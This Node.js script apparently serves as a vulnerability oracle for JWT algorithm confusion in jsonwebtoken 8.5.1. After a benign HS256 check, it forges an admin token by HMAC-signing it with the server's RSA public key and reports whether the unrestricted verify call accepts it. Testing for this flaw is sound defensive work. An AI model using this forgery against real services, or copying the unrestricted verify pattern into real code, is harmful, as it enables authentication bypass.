'use strict';
const crypto = require('crypto');
const jwt = require('jsonwebtoken');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function main() {
  const marker = 'jwt-algconfusion-' + Date.now() + '-' + Math.random().toString(36).slice(2);
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  // --- Setup: generate an RSA keypair to act as the server's asymmetric signing key ---
  let publicKeyPem, privateKeyPem;
  try {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });
    publicKeyPem = publicKey;
    privateKeyPem = privateKey;
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Setup failed generating RSA keypair: ' + String(e && e.message) });
    return;
  }

  // --- Benign operation: sign & verify a normal HS256 token with a shared secret ---
  let benignPayload;
  try {
    const sharedSecret = 'benign-shared-secret-' + marker;
    const benignToken = jwt.sign({ sub: 'alice', marker: marker }, sharedSecret, { algorithm: 'HS256' });
    benignPayload = jwt.verify(benignToken, sharedSecret, { algorithms: ['HS256'] });
    if (!benignPayload || benignPayload.sub !== 'alice' || benignPayload.marker !== marker) {
      finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Benign verify did not return expected payload' });
      return;
    }
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Benign operation threw unexpectedly: ' + String(e && e.message) });
    return;
  }

  operation_completed = true;

  // --- Malicious operation: attacker forges an HS256 token using the RSA public key PEM as the HMAC secret ---
  // Server-side verification call simulated here: it trusts the caller-supplied key material (the RSA public key)
  // but does NOT restrict algorithms, which is the vulnerable pattern in jsonwebtoken 8.5.1.
  try {
    const header = { alg: 'HS256', typ: 'JWT' };
    const payload = { sub: 'attacker', admin: true, marker: marker };

    function base64url(input) {
      return Buffer.from(JSON.stringify(input)).toString('base64')
        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    }

    const encodedHeader = base64url(header);
    const encodedPayload = base64url(payload);
    const signingInput = encodedHeader + '.' + encodedPayload;

    // Attacker signs with HMAC-SHA256 using the server's known RSA public key PEM as the "secret"
    const hmac = crypto.createHmac('sha256', publicKeyPem).update(signingInput).digest('base64')
      .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

    const forgedToken = signingInput + '.' + hmac;

    // Server verifies using the RSA public key, expecting RS256 semantics, but WITHOUT
    // restricting algorithms -- this is the vulnerable call pattern.
    const decoded = jwt.verify(forgedToken, publicKeyPem);

    if (decoded && decoded.admin === true && decoded.marker === marker) {
      exploit_succeeded = true;
      evidence = 'jwt.verify() accepted a forged HS256 token signed with the RSA public key as HMAC secret and returned payload: ' + JSON.stringify(decoded);
    } else {
      evidence = 'jwt.verify() returned an unexpected payload shape, not treated as exploit success: ' + JSON.stringify(decoded);
    }
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'Malicious verify was rejected as expected: ' + String(e && e.message);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'Unhandled exception in oracle: ' + String(e && e.message)
  }));
}
